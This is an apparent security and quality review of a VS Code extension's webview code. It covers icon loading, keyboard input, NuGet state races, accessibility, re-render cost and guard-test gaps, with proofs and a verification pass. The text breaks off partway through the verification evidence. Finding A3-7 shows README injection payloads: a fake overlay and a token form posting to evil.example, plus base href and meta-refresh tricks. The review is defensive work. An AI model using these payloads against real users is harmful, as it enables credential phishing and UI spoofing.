# Code Review, Area 3: Webview Code (2026-10-24)

Scope: `src/webview/solution-view`, `nuget-view`, `error-list`, `publish-view`, `configuration-view`, `startup-view`, `template-wizard`, `src/webview/shared`, the HTML shells in `src/webview/providers/views/`, and `webpack.config.js` as it concerns the webview bundles. Host code was read only where a webview behaviour depends on what the host sends.

Method: every file in scope read in full (about 6,000 lines). Proofs were run in a scratch copy of the repo (`/tmp/review-a3`, `node_modules` symlinked) as jest/jsdom tests under `src/test/unit/review/` of that copy; the guard tests were mutation-tested there; the webview bundles were built there (`npx webpack --config-name webview --mode development`) and grepped. No VS Code, Electron or browser was started. The existing webview tests pass in the copy (25 suites, 141 tests), as do `webviewBundle.test.ts` and `opaqueNodeIds.test.ts`. Known bugs and Not Planned items of `docs/roadmap.md` were left out. jsdom timings are slower than Chromium (roughly 2-5x); they are given to compare interactions, not as absolute numbers.

## Summary

| Id | Severity | Proven? | One line |
|---|---|---|---|
| A3-1 | bug | proven | Solution Explorer icons and expand chevrons are downloaded from `api.iconify.design` at runtime: offline or behind a firewall the tree has no chevrons and no fallback icons |
| A3-2 | bug | proven (jsdom), Windows/macOS layout typing not tried | The Solution Explorer cancels every key event with Alt: AltGr characters (Windows: `@ # [ ] { } \ \| ~` on Swiss/German layouts) and Option characters (macOS) cannot be typed in the rename input |
| A3-3 | bug | proven | NuGet Browse: Up/Down walk a locally filtered copy of the results, not the list shown: the highlighted row and the package in the details (and the one Install acts on) differ |
| A3-4 | bug | proven | NuGet: every refresh (`nugetData`, sent after each install and on every package re-evaluation of a project) empties the Browse search results |
| A3-5 | bug | proven | NuGet README: a slow earlier fetch overwrites the README of the package selected later; an error of the previous package stays shown for the next one |
| A3-6 | bug | proven | Error states are dropped: NuGet ignores `error` (loading bar and disabled Search forever) and the search's `error` ("No results found" for a failed feed); the Solution Explorer shows "No solution found" for a load error and re-requests a full reload on every unrelated message |
| A3-7 | risk | proven (DOM), form submission suspected | NuGet README raw HTML: full-window `position:fixed` overlays, `<form action="https://...">` with inputs and `<base href>` survive markdown-to-jsx; CSP has no `form-action`/`base-uri`, and `'unsafe-eval'` without need |
| A3-8 | risk | proven | Solution Explorer re-renders every row on each hover change, arrow key, diagnostics update, editor switch and tree message (5,551 rows: 6,102 icon renders, ~130-180 ms React time per mouse move in jsdom); merge reference-preservation is defeated; no virtualization |
| A3-9 | bug (a11y) | proven (code) | Solution Explorer has no ARIA tree semantics and a CSS-only focus: screen readers announce nothing; no keyboard multi-select; markers distinguish error/warning by colour only |
| A3-10 | bug (a11y) | proven (code) | Keyboard gaps in the other views: href-less `<a>` links (Publish Rename/Delete/Open .pubxml/Open folder, Error List code links), Error List sort headers not focusable, NuGet checkboxes without accessible name, NuGet package rows and Consolidate list without keyboard |
| A3-11 | bug | proven (webview), host effect suspected | Template wizard sends `create` again for every Enter/Create before the host's `busy` arrives (3 requests in the test): concurrent `dotnet new` into the same folder |
| A3-12 | risk | proven (mutation) | The guard tests have gaps: an id decoder in `src/core` imported by the webview passes the opaque-id test; `process.platform` in webview code passes the bundle build (runtime `ReferenceError` in the webview) |
| A3-13 | cleanup | proven (grep/test) | Dead code and noise: `FrameworkSelector`, `handleFrameworkChange`, `activeFilePath`/`isActiveFile`, `PureWebviewAPI` fallback, unused HTML templates, no-op "re-fetch" `setIncludePrerelease(prev => prev)`, request during render (2 at startup), `console.error` of whole payloads, `innerHTML` on a React node, click timer not cleared on unmount |

## Findings

### A3-1 (bug, proven): icons and chevrons come from the network

`TreeNode.tsx:354` (`<Icon icon="codicon:chevron-right">`) and `TreeNode.tsx:400` (all built-in icons: `mdi:*`, `carbon:*`, `simple-icons:nuget`, ...) use `@iconify/react` 6.0.2 without any bundled collection (`grep -rn "addCollection\|addIcon" src` finds nothing). Iconify then fetches the icon sets from its public API at runtime; the Solution Explorer CSP opens `connect-src https: data:` for it (`SolutionWebview.ts:23`). Area 2 (A2-11) lists the third-party request and the CSP; this finding is the user-visible part.

Scenario: a developer on a train, or in a company network that blocks unknown hosts, opens a solution: every expandable row has no chevron and every row without a theme icon (dependencies, solution/project nodes when the icon theme has none, all files without a file icon theme) has no icon. Only the user's file icon theme still works.

Proof (`iconifyOffline.test.tsx`, fetch rejecting like offline):
```
fetches: https://api.iconify.design/codicon.json https://api.unisvg.com/codicon.json https://api.simplesvg.com/codicon.json https://api.iconify.design/mdi.json https://api.unisvg.com/mdi.json https://api.simplesvg.com/mdi.json
row svg count: 0
row html: <span></span><div class="node-icon" ...><span>
```
The built bundle contains `api.iconify.design` (`grep -c api.iconify.design out/webview/solution-view/bundle.js` = 1). Fix: register the used icons offline (`addCollection` from `@iconify-json/mdi` etc., or `@iconify/react/offline` with icon data), then drop `connect-src`.

### A3-2 (bug, proven in jsdom): AltGr and Option characters cannot be typed in the Solution Explorer

`solution-view/App.tsx:13-31` adds capture-phase `keydown`/`keyup` listeners on `document` that `preventDefault()` and `stopPropagation()` every event with `e.altKey`, to keep VS Code's menu bar from opening. They also hit the rename input (`RenameInput.tsx`) and the new file/folder input. Chromium on Windows reports AltGr as Ctrl+Alt (`altKey` true); macOS Option is `altKey`.

Scenario: on Windows with a Swiss or German layout, renaming `Page.razor` to `[Id].razor` or typing `@`, `#`, `{`, `}`, `\`, `|`, `~`: nothing appears. On a Swiss/German Mac, the same for Option+5 (`[`), Option+G (`@`), Option+L (`@` on German). The handler also swallows every Alt key binding of VS Code while the tree has focus.

Proof (`altGr.test.tsx`): with the App mounted, a `keydown` `{ key: '@', ctrlKey: true, altKey: true }` dispatched on an input gives
```
key '@' via AltGr: defaultPrevented=true, reached the input's handler=false
```
A cancelled `keydown` suppresses the character by spec; typing on real Windows/macOS layouts was not tried. Fix: skip editable targets and `e.getModifierState('AltGraph')`/Ctrl+Alt, and block only Alt alone (the menu bar key).

### A3-3 (bug, proven): NuGet Browse keyboard selection differs from the highlighted row

`nuget-view/App.tsx:601-605`: for Browse, `getCurrentPackageList()` returns `filterPackages(enhancedSearchResults, searchTerm)`, which keeps only results whose id, description or authors contain the search term. The list shown (`App.tsx:713`) is the unfiltered `enhancedSearchResults`. `PackageList` highlights by index (`PackageList.tsx:96-105`). NuGet search also matches tags and other fields, and the term can be edited after the search, so the two lists differ.

Scenario: search `json`; results `Newtonsoft.Json`, `Jil` (matched by tag), `System.Text.Json`. Press Down twice: row 2 (`Jil`) is highlighted, the details and the Install button are for `System.Text.Json`.

Proof (`nugetApp.test.tsx`, vscrui replaced by plain stand-ins):
```
Highlighted row: Jil | details header: System.Text.Json
```
Fix: navigate the same array that is rendered.

### A3-4 (bug, proven): a refresh empties the Browse results

The host puts `searchResults: []` into every `nugetData` (`NuGetCustomEditorProvider.ts:370`, `385`), and the webview replaces its whole state with it (`nuget-view/App.tsx:118`, `setData(safeData)`). `nugetData` is sent after every install, uninstall, update and consolidate (`_updateWebview`), and by the 500 ms refresh timer whenever a project's packages are evaluated again (`NuGetCustomEditorProvider.ts:46-64`), i.e. after any project file change or restore.

Scenario: in Browse, search `Serilog`, install `Serilog` into a project: the result list goes to `Browse (0)` and the user has to search again for the next package (`Serilog.Sinks.Console`). The same happens while browsing when a build or restore touches a project. Visual Studio keeps the results.

Proof (`nugetApp.test.tsx`):
```
Before refresh: 2 rows
After refresh: H2,DIV rows; header: Browse (0)
```
(the two remaining matches are the details panel of the still-selected package). Fix: keep `searchResults` (and `consolidatePackages`) from the previous state when merging `nugetData`, or stop sending empty arrays.

### A3-5 (bug, proven): README fetch race and stale error

`nuget-view/components/NugetReadme.tsx:15-43`: the effect starts a `fetch` for every package change and never cancels or checks the previous one; `setError(null)` is called only when a URL exists.

Scenario 1: the README tab is open; click package A (large README, slow), then B: B's README appears, then A's arrives and replaces it while B is selected. Scenario 2: A's README fails (HTTP 500 or CSP); select C, which has no README: "Error: Failed to fetch README: 500" stays.

Proof (`readmeRace.test.tsx`, controlled fetch promises):
```
Selected B, shown: README OF A
Selected C (no README), shown: Error: Failed to fetch README: 500
```
Fix: an `AbortController` (or an "ignore" flag) in the effect cleanup, and reset `error`/`loading` in every branch.

### A3-6 (bug, proven): error states are swallowed

- NuGet: the host's catch-all in `_handleMessage` sends `{ type: 'error' }` (`NuGetCustomEditorProvider.ts:177-183`), but `nuget-view/App.tsx:105-258` has no `error` case: `loading` stays true, the loading bar runs forever and Search, Install, Uninstall and Update stay disabled (`disabled={loading ...}`) until the editor is reopened. Proof (`nugetApp.test.tsx`): after Search and an `error` message, `search button disabled=true, text shows boom=false`.
- NuGet search: a failed search sends `searchResults: []` with `error: 'Search failed'` (`NuGetCustomEditorProvider.ts:409-415`); the webview ignores `error` (`App.tsx:162-168`), so an unreachable feed looks like no matches. Proof: after `{ searchResults: [], error: 'getaddrinfo ENOTFOUND api.nuget.org' }` the view shows `No results found for "serilog"`.
- Also in NuGet: if loading the data fails, the host returns `{}` (`NuGetCustomEditorProvider.ts:388-391`); the view shows empty lists as if nothing were installed.
- Solution Explorer: `useVsCodeApi.ts:299-302` logs `error` and only clears `loading`; `App.tsx:47-48` then shows "No solution found" although a solution exists and loading failed ("Failed to load solution data" is never shown). `App.tsx:35-37` sends `getSolutionData` during every render while there is no data; with no cached data the host starts a full reload each time (`SolutionWebviewProvider.ts:464-466`). So after a failed load, every editor switch (`activeFileChanged`), icon theme or diagnostics message triggers another full solution load. Proof (`startupRequests.test.tsx`):
```
getSolutionData at startup: 2, after error + 2 unrelated messages: 5; shown: "No solution found"
```

### A3-7 (risk, proven in the DOM; form submission suspected): README raw HTML can restyle and overlay the NuGet manager

`NugetReadme.tsx:75-169` renders the package README (written by any package author) with markdown-to-jsx 9.10.3 and its default raw-HTML parsing. markdown-to-jsx drops scripts, `on*` attributes, `javascript:` URLs, iframes and `<style>`, but keeps inline `style`, `<form>`, `<input>`, `<button>` and `<base>`. The NuGet CSP (`NuGetWebview.ts:25`) is `script-src 'nonce-…' 'unsafe-eval'; style-src 'unsafe-inline' …; img-src … https: data:`, with no `form-action` and no `base-uri` (neither falls back to `default-src`).

Scenario: a package's README holds `<div style="position:fixed;inset:0;background:var(--vscode-editor-background)">…</div>` with a fake "Your feed token expired" form posting to the author's server. Opening the README tab covers the whole NuGet manager with it. Whether VS Code lets the form navigate the webview frame was not tried (its webview iframe sandbox includes `allow-forms`).

Proof (`readmeXss.test.tsx`, rendered HTML, excerpt):
```
<img src="x">                                   (onerror dropped)
<a style="...">click</a>                        (javascript: href dropped)
<span>&lt;iframe ...&gt;</span> <span>&lt;script&gt;...</span> <span>&lt;style&gt;...</span>   (escaped)
<div id="overlay" style="position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; background: white;">Fake UI</div>
<form action="https://evil.example/steal" method="post"><input placeholder="NuGet API key" name="token"><button>Save</button></form>
<base href="https://evil.example/">
```
`'unsafe-eval'` is not needed: the built nuget-view and solution-view bundles contain no `eval(` or `new Function` (dev build checked; `webviewBundle.test.ts` already enforces a non-eval devtool). Fix: a markdown-to-jsx `overrides`/`renderRule` that drops `form`, `input`, `button`, `base`, `meta` and `style` attributes (or `disableParsingRawHTML` plus allowed `img`/`details`), and `form-action 'none'; base-uri 'none'` without `'unsafe-eval'` in the CSP.

### A3-8 (risk, proven): the whole Solution Explorer re-renders on every small change

- `TreeNode.tsx:15` is a plain function component (no `React.memo`), and `SolutionTree.tsx:600-625` passes new handler functions on every render plus tree-wide values (`hoveredNodeId`, `focusedNodeId`, `dropTargetId`, `selectedNodeIds`, `markers`, `activeFilePath`) to every row. Any state change in `SolutionTree` renders all visible rows.
- `SolutionTree.tsx:144-151,165` (`buildTreeNodes`) copies every node on each `projects` change, so `mergeTreeData`'s reference preservation (`useVsCodeApi.ts:98-166`) has no effect; the merge itself also returns a new object for every node with children (`useVsCodeApi.ts:135-140`).
- `setHoveredNodeId` runs on `mouseover`/`mousemove` (`TreeNode.tsx:342-343`), so moving the mouse over the tree renders the whole tree once per row crossed. `activeFileChanged` (every editor switch) sets `activeFilePath`, which nothing uses (`TreeNode.tsx:48`, `isActiveFile = false`), and renders the whole tree. `diagnostics` (every 300 ms while typing with changing errors) does the same.
- `handleNodeDragOver` (`SolutionTree.tsx:240`) and `hasLoadingNode` (`:526`, every render) walk the whole tree; there is no virtualization (all expanded rows are in the DOM).

Proof (`treePerf.test.tsx`/`treeCount.test.tsx`, synthetic solution: 50 projects x 10 folders x 10 files, all expanded = 5,551 rows; `Icon` stubbed to count renders):
```
nodes=5551, rendered rows=5551, mount wall 846 ms
hover one row:      Icon renders 6102 (every row), React render 132 ms, wall 203 ms
hover 3 more rows:  1 commit, React render 179 ms
ArrowDown:          Icon renders 6102, React render 125 ms
solutionData with 1 renamed file (merge 4 ms): Icon renders 6102, React render 133 ms
merge preserved the solution/project object references: false
```
6,102 = 5,551 node icons + 551 chevrons, i.e. every row. Fix: `React.memo(TreeNode)` with per-row booleans (`isHovered`, `isFocused`, `isSelected`, `marker`) instead of tree-wide ids, stable callbacks (`useCallback` or a ref-based dispatcher), drop `buildTreeNodes`, keep unchanged subtrees by reference in `mergeTreeData`, hover through CSS or a ref; for very large trees a flat virtualized list (the tree is already flattened for keys).

### A3-9 (bug, accessibility, proven by code): the Solution Explorer is invisible to screen readers

`grep -rn "role=\|aria-" src/webview/solution-view` finds nothing. The tree container (`SolutionTree.tsx:574-578`) is a `div` with `tabIndex={0}` and no `role="tree"`; rows (`TreeNode.tsx:331`) have no `role="treeitem"`, `aria-expanded`, `aria-selected`, `aria-level` or `id`; the keyboard focus is only the CSS class `focused`, with no `aria-activedescendant`. With NVDA/Orca, Up/Down in the tree announce nothing. Also:
- Selection is mouse-only for more than one node: no Shift+Up/Down, Ctrl+Space or Shift+Space (`SolutionTree.tsx:355-450`), although Delete, Build, Cut/Copy act on the selection (`docs/solution-explorer.md:77`).
- Up/Down move only the focus outline, the selection stays (documented: "Space selects the focused node"); Visual Studio and VS Code move the selection. After Ctrl+click on A and B and Down to C, Delete acts on C (the host acts on the selection only if it contains the focused node, `SolutionWebviewProvider.ts:186-191`) while A and B are the highlighted rows.
- Folder/project markers (`TreeNode.tsx:434-436`, `.diagnostic-dot`) tell error from warning by colour only; the text is in a `title`, which keyboard and screen-reader users don't get.

### A3-10 (bug, accessibility, proven by code): keyboard gaps in the other views

- `publish-view/App.tsx:136,145,234-236`: Rename, Delete, Open .pubxml and Open folder are `<a className="link" onClick>` without `href`, `tabIndex` or key handler: not reachable with Tab, no Enter. Rename and Delete of a publish profile cannot be done from the keyboard.
- `error-list/App.tsx:173`: the code link (`CS0168` to its docs) is the same kind of `<a>`. `:155`: the sort headers are `<span role="button">` without `tabIndex` or key handler. `:169`: every row is a tab stop (5,000 rows = 5,000 Tab presses to reach the end, no arrow navigation; see the timing in "Checked and fine").
- `nuget-view/App.tsx:677-688, 810-821, 965-990, 1221-1232`: vscrui's `Checkbox` is a hidden `<input>` inside a `<label>` that shows only its `children`; the app passes no children and puts "Include prerelease"/"Select all" in a separate `<label onClick>`, so the checkboxes have no accessible name (vscrui source `node_modules/vscrui/dist/checkbox.js`). The package checkboxes in Updates/Consolidate and the project checkboxes (`ProjectList.tsx:70-84`) also have none.
- NuGet package rows (`PackageList.tsx:94-108`) are clickable `div`s without role or focus; the list container takes Up/Down only (no Home/End, Enter); the Consolidate list has no `tabIndex`/`onKeyDown` at all (`App.tsx:1245-1253`), so it cannot be navigated by keyboard.

### A3-11 (bug, proven in the webview; host effect suspected): the template wizard submits several times

`template-wizard/App.tsx:179-189`: `create()` checks `busy`, but `busy` is only set when the host's `{ type: 'busy' }` message arrives (`TemplateWizardPanel.ts:41`). Enter in the name field (`:238`) and the Create/Add button (`:260, :315`) can fire again before that. The host handles each request concurrently (no guard), and its "folder not empty" check runs before `dotnet new` writes (`templateService.ts:201`, `:240`), so two requests both pass.

Proof (`wizardDouble.test.tsx`): Enter, Enter, click Create in the configure page:
```
create requests: 3
```
Suspected effect: two or three `dotnet new` runs into the same folder and `dotnet sln add` repeated, or an error box for the later runs after the first one succeeded and closed the panel. Fix: set a local "submitted" flag in `create()`; the host should also ignore a `create` while one runs.

### A3-12 (risk, proven by mutation): what the guard tests do not catch

- `src/test/unit/webview/shared/opaqueNodeIds.test.ts` scans only files under `src/webview` (minus `providers`) for `services/nodeIdService`, `zlib`, `atob(` and `Buffer.from(`. The webview already imports shared code from `src/core` (`dropRules`, `contextMenus`, `utils`). Mutation: a new `src/core/idPeek.ts` with `JSON.parse(globalThis.atob(...))`, used from `webview/shared/nodeIdUtils.ts` → the test passes (`Tests: 1 passed`). The direct import of `services/nodeIdService` is caught (`1 failed`). Fix: follow the imports of the webview entry points (e.g. read webpack's `stats.modules` in the existing bundle test) and check every bundled `src/` module.
- `src/test/unit/build/webviewBundle.test.ts` catches modules that don't resolve (mutation: importing `core/logger` fails with `Can't resolve 'util'`), but not Node globals: `process.platform === 'win32'` in `webview/shared/dragCopyKey.ts` builds without error (`Tests: 1 passed`), and would throw `ReferenceError: process is not defined` in the webview. jsdom tests don't notice either, since Node's `process` exists there. Packages that shadow Node modules (`events`, `string_decoder`, `punycode` are in `node_modules`) would also be bundled silently. Fix: in the bundle test, fail on `process.`/`require(`/`__dirname` in the emitted code of `src/` modules, or set `node: false` and `DefinePlugin` for `process` to make it a build error.

### A3-13 (cleanup, proven by grep/tests)

- Dead code: `solution-view/components/FrameworkSelector/` (not imported), `handleFrameworkChange` (`useVsCodeApi.ts:350-353`, unused), `activeFilePath` passed down to every row while `isActiveFile` is hard-coded `false` (`TreeNode.tsx:48`; see A3-8 for its render cost), `removeTemporaryNodeFromTree` mutates the previous state's `node.children` (`useVsCodeApi.ts:229`; harmless only because `buildTreeNodes` copies).
- `shared/vscode-api.ts` (`PureWebviewAPI`) is the fallback of `nuget-view/shared.ts:58-67` when `acquireVsCodeApi()` throws: messages are then silently looped back and state written to `localStorage`. In production a second `acquireVsCodeApi()` (the error it throws) would be hidden instead of failing loudly. `nuget-view/shared.ts` also holds the host helper `sendToUi` and `import * as vscode from 'vscode'` (`:6, :77`), imported by every webview: type-only today, one value use breaks all bundles.
- `webpack.config.js:84-93` emits `solution-view/index.html` and `nuget-view/index.html` from `template.html` files with their own CSP and `NONCE_PLACEHOLDER`; nothing loads them (the providers build the HTML).
- `nuget-view/App.tsx:215, 226`: `setIncludePrerelease(prev => prev); // Trigger re-fetch` does nothing (same value, no render, no effect); the refresh works only because the host already sent `nugetData`.
- `solution-view/App.tsx:34` and `useVsCodeApi.ts:292-295`: `console.error` with emoji on every render and with the whole tree payload on every message (debug leftovers; they also print in every jest run).
- `PackageList.tsx:146-152`: on an icon load error `parent.innerHTML = '📦'` replaces children React owns (no user input, but React's later reconciliation of that `<img>` works on a detached node).
- `TreeNode.tsx:72-91`: the 250 ms single-click timer is not cleared on unmount; a row removed by a refresh within 250 ms still calls `onNodeClick` with its id (selection and `treeSelectionChanged` with an id no longer in the tree).

## Checked and fine

- No `dangerouslySetInnerHTML`, `insertAdjacentHTML` or `document.write` in webview code; the only `innerHTML` is the constant in A3-13. File names, package ids, descriptions, authors, error messages and template texts are rendered as React text. React 19 blocks `javascript:` in `href` (package `projectUrl`/`licenseUrl`, `NugetDetail.tsx:199, 236`), and the Error List's `openUrl` is checked for `http(s)` on the host (`ErrorListViewProvider.ts:70`).
- Every HTML shell has `default-src 'none'` and a nonce-only `script-src` (no `'unsafe-inline'` scripts), fresh 32-character nonces per HTML build, URIs from `asWebviewUri`; the template wizard's title is stripped of `<>&"`; `data-include-prerelease` is a boolean. Inline event-handler XSS is therefore blocked even where markup gets through (A3-7).
- markdown-to-jsx 9.10.3 drops `<script>`, `on*` attributes, `javascript:` URLs (also in markdown links and SVG), `<iframe>`, `<object data>` and `<style>` (A3-7 proof).
- Node ids stay opaque in the webview today: compared, used as keys and sent back; `nodeIdUtils.ts` is an identity; `dropRules.ts` compares ids only; `types/index.ts` imports `nodeIdService` for a type only (elided). The bundles contain no Node module code; `dragCopyKey.ts` uses `navigator`, not `process`; semver's and styled-components' `process` uses are guarded by `typeof process`.
- Every bundle calls `acquireVsCodeApi()` once (bundle grep).
- Listeners: every `window`/`document` listener in the seven views is removed in its effect cleanup (message handlers, Alt blocker, focus/blur, column filter and `Select` outside clicks); the drag auto-expand timer and the loading-bar delay are cleared; `RenameInput`'s focus timer is guarded.
- Configuration Manager, Configure Startup Projects and Publish: labelled inputs (`htmlFor`/`aria-label`), `role="alert"` errors, real buttons; `Select` is keyboard-operable (arrows, Home/End, Enter/Space, Alt+Down, Escape) with `aria-haspopup`/`aria-expanded`/`listbox`/`option` (it lacks `aria-activedescendant` while open, so the active option is not announced; minor).
- Error List with 5,000 rows (`errorListPerf.test.tsx`): first render 599 ms, refresh 672 ms, one keystroke in Search 561 ms in jsdom. The host debounces diagnostics by 300 ms, so this is acceptable for typical counts; a solution with thousands of warnings would profit from virtualization or a debounced search.
- `mergeTreeData` itself is cheap (4 ms for 5,551 nodes).

## Not reviewed / limits of this review

- Nothing was run in a real Chromium/VS Code webview: CSP enforcement, VS Code's handling of form submissions in webviews (A3-7), real AltGr/Option typing (A3-2) and absolute render timings (A3-8, jsdom only) are unverified. Screen-reader output (A3-9, A3-10) is derived from the markup, not tested with NVDA/Orca/VoiceOver.
- vscrui components (Panels, Dropdown, TextField) are ESM-only in jest and were replaced by stand-ins; their own keyboard and ARIA behaviour was only read in `node_modules/vscrui/dist` for `Checkbox`.
- The production (`mode: production`) bundles were not built; the eval/`process` greps used the development build.
- Host behaviour was read only where the webview depends on it. Suspected but out of scope (area 2/4): the NuGet editor gets data twice at open, once from the host with `includePrerelease` hard-coded `false` (`NuGetCustomEditorProvider.ts:117`) and once from the webview with the setting; if the `false` answer arrives last, the lists ignore a checked "Include prerelease". Colour contrast of the hard-coded icon colours (`TreeNode.tsx:175-294`, e.g. `#68217A` VB purple) against light themes was not measured.
- The scratch tests live in `/tmp/review-a3/src/test/unit/review/` (not in the repo) and can be copied into `src/test/unit/` as the failing tests of the fixes.

## Verification (second pass, 2026-10-24)

Method: code reread at HEAD `1b32635`; proofs re-run or rewritten in a separate scratch copy (`/tmp/verify-a3`, `node_modules` symlinked, no repo file changed); real-browser checks in Playwright's Chromium headless shell (build 1243, from `~/.cache/ms-playwright`, driven by `playwright-core` from another local checkout) with `DISPLAY=:96`, `WAYLAND_DISPLAY` unset, files under `/tmp`, no network (requests intercepted). Done.

| Id | Verdict | Severity after verification | Note |
|---|---|---|---|
| A3-1 | CONFIRMED | bug | Reproduced in Chromium under the real CSP, offline: 0 svgs, 6 requests to 3 iconify hosts; no persistent cache in @iconify/react 6 |
| A3-2 | CONFIRMED (Windows insertion inferred) | bug | Alt+char insertion blocked in real Chromium; Ctrl+Alt (Windows AltGr) cancelled by the handler; real Linux AltGr unaffected |
| A3-3 | CONFIRMED | bug | Reproduced; the Jil example is weak, but any multi-word query (`json serializer`) puts the highlight and the details on different rows and stops the arrow keys |
| A3-4 | CONFIRMED | bug | `setData(safeData)` with the host's `searchResults: []`; reproduced |
| A3-5 | CONFIRMED | bug | Reproduced; also "Loading README..." and then A's text are shown for a package without README |
| A3-6 | PARTIALLY CONFIRMED | bug (Solution Explorer); latent (NuGet `error`) | The NuGet `error` and search `error` messages are practically never sent: handlers catch themselves, feed failures are swallowed by `allSettled` in the host. A failed feed still shows "No results"; the fix belongs to the host |
| A3-7 | CONFIRMED, worse | bug (security), up from risk | Chromium + real CSP: the overlay covers, `<base>` redirects relative URLs, the form POSTs to the attacker, and a README `<meta http-equiv=refresh>` (hoisted to `<head>` by React 19) navigates the webview with no click; `form-action`/`base-uri 'none'` do not stop the meta |
| A3-8 | CONFIRMED | risk | Reproduced; in real Chromium, 5,551 rows: about 600 ms per hover change and 350 ms per `activeFileChanged` (112 rows: about 15-27 ms) |
| A3-9 | CONFIRMED (code) | bug (a11y) | No role/aria in solution-view; key bindings act on the focused node outside the selection |
| A3-10 | CONFIRMED (code) | bug (a11y) | href-less anchors, sort span without tabIndex; vscrui spreads props onto the label, so the name must come as `children` |
| A3-11 | CONFIRMED (webview) | bug (minor) | No local guard; the window is the `busy` round trip, so a fast double input or a busy extension host is needed |
| A3-12 | CONFIRMED (mutation + Chromium) | risk | Both mutations pass the guards; the `process.platform` mutation throws `process is not defined` on drag in real Chromium |
| A3-13 | sanity check OK | cleanup | All items still present at HEAD |

### Evidence per finding

**A3-1 CONFIRMED (bug).** Reproduced in real Chromium with the built `solution-view` bundle under the exact Solution Explorer CSP (`connect-src https: data:`) and all external requests aborted as offline: the solution and project rows render with 0 `<svg>` (no chevron, no icon); the bundle requested `GET https://api.iconify.design/codicon.json`, `.../mdi.json`, then the same from `api.simplesvg.com` and `api.unisvg.com`. With the requests answered (intercepted, fake icon data), each row gets its 2 svgs. No guard was missed: `@iconify/react` 6.0.2 (`dist/iconify.js:645-650, 790`) fetches through `fetch()` and has no persistent browser cache (no `localStorage` use in the 6.x dist), so it fetches again on every webview load, not just the first; `node_modules/@iconify` holds only `react` and `types` (no `@iconify-json/*` data to register). The reviewer's jsdom test also passes in the second copy. Note for the fix: the shell already loads the bundled `out/webview/codicons/codicon.css`, so the chevron can be a `codicon codicon-chevron-right` span without any icon data.

**A3-2 CONFIRMED for Option/Alt characters (reproduced), Windows AltGr part confirmed for the handler, insertion not reproducible on Linux (bug).** The handler (`solution-view/App.tsx:17`) is the only Alt check and has no editable-target or `AltGraph` exception. Real Chromium, raw CDP `Input.dispatchKeyEvent` with `text`, a plain `<input>` focused in the same document as the real bundle: Alt+`[` (macOS Option+5 on a Swiss layout) inserts `[` without the bundle and nothing with it (the input's own `keydown` never fires). Ctrl+Alt+`@` (what Windows Chromium reports for AltGr+2, `altKey` and `ctrlKey` true) is cancelled by the handler before the input sees it; that Linux Chromium itself does not insert Ctrl+Alt text (also without the bundle) means the insertion half of the Windows case cannot be shown here, but a cancelled `keydown` suppresses the character on Windows as well. The true Linux AltGr (`key: 'AltGraph'`, `altKey` false) is not affected: `@` is typed with the bundle. Scenario wording stands for Windows and macOS; Linux users are fine.

**A3-3 CONFIRMED (bug); the reviewer's example is weak, a stronger one is a multi-word query.** `getCurrentPackageList()` (`nuget-view/App.tsx:601-605`) filters Browse by the whole search string as one substring, while `PackageList` gets the unfiltered `enhancedSearchResults` (`:713`). The example in the scenario (Jil matched only by tag) is unlikely as written, since Jil's real description contains "JSON". But NuGet's search matches terms separately, so any multi-word query breaks it. Own test (`v_nugetNav.test.tsx`, realistic descriptions): query `json serializer`, results Newtonsoft.Json, System.Text.Json, Utf8Json (only Utf8Json's description has "json serializer" in it): Down#1..#3 all show `highlighted=Newtonsoft.Json details=Utf8Json`: the highlight sits on row 1, the details and Install are for row 3, and Down cannot move. With a single word that every result contains, navigation is correct. Field queries such as `owner:microsoft` or `packageid:serilog` filter down to nothing, so the arrow keys do nothing. The reviewer's test passes in the second copy.

**A3-4 CONFIRMED (bug).** The `nugetData` case calls `setData(safeData)` with the host's `searchResults: []` (`NuGetCustomEditorProvider.ts:370, 385`); no merge with the previous state anywhere. The install, uninstall, bulk update and consolidate handlers all `await this._updateWebview(...)` before their `*Complete` message, and the 500 ms timer in `_packagesEvaluated` (`:46-64`) does the same. Reviewer's test reproduced (`Before refresh: 2 rows`, `After refresh: ... Browse (0)`).

**A3-5 CONFIRMED (bug), slightly worse than written.** `NugetReadme` is rendered without a `key` (`NugetDetails.tsx:71-75`), so one instance serves every package, and the effect has no cleanup. Besides the two scenarios in the review: in the no-README branch `loading` is not reset either, so with A still loading, selecting C (no README) keeps "Loading README..." until A's fetch ends, and then A's text is shown for C. Note for scenario 2: the NuGet CSP is `connect-src https://api.nuget.org`, so README URLs of other feeds (Azure DevOps, private feeds) always fail with a CSP error, which then also sticks (area 4 topic). Reviewer's test reproduced.

**A3-6 PARTIALLY CONFIRMED: the Solution Explorer part holds; the two NuGet `error` bullets are not reachable from today's host (severity: bug for the Solution Explorer, cleanup/latent for NuGet).**
- NuGet `error` message: every handler that `_handleMessage` dispatches to has its own `try/catch` as its first statement and sends its own completion message (`installComplete`, `uninstallComplete`, `bulkUpdateComplete`, `bulkConsolidateComplete`, `consolidatePackages`, `packageIcon`, `packageReadme`), and `_updateWebview` catches and only logs. So the catch-all `{ type: 'error' }` (`:177-183`) fires only for a throw outside them (e.g. a malformed message). The webview really has no `error` case (the reviewer's test shows it), but "loading bar and disabled Search forever" does not happen in normal use. Latent; handle it anyway.
- NuGet failed search: the `error: 'Search failed'` branch (`:409-415`) is in practice never reached. `PackageBrowseService.searchAcrossConfiguredSources` runs the feeds through `Promise.allSettled` and only logs rejected ones (`packageBrowseService.ts:313-321`), and its fallback returns `[]` (`:335-338`). So an unreachable feed does look like "No results found for ..." (that effect is real), but the host never sends an error, and adding an `error` case to the webview alone would change nothing. The fix has to be in the host (area 4): pass on that every feed failed.
- NuGet `{}` on a data failure (`:388-391`): confirmed by code; the view shows empty lists.
- Solution Explorer: confirmed. The host's debounced load sends `error` + `hideLoading` on failure (`SolutionWebviewProvider.ts:95-105`). The webview shows "No solution found". `getSolutionData` during render → `_sendCachedData` → with no cache, `_updateViewDebouncer.trigger()` (`:464-466`). It is not an endless loop: a repeated `error`/`hideLoading` sets the same state, so React does not re-render. But every unrelated message that changes state (`activeFileChanged`, `diagnostics`, `iconTheme`) starts another full load. That is a retry; it can also succeed later, but the message stays wrong until then. Reviewer's test reproduced (2 → 5 requests).

**A3-7 CONFIRMED in real Chromium, and worse than written: severity up from risk to bug (security).** The real `nuget-view` bundle ran under the exact NuGet CSP (`'unsafe-eval'`, `img-src https: data:`, `connect-src https://api.nuget.org`, no `form-action`/`base-uri`), with a package README served from an intercepted `api.nuget.org` URL, after a click on the README tab:
- A `position:fixed` div of 1280x720 covers the whole manager (`elementFromPoint(10,10)` is inside it).
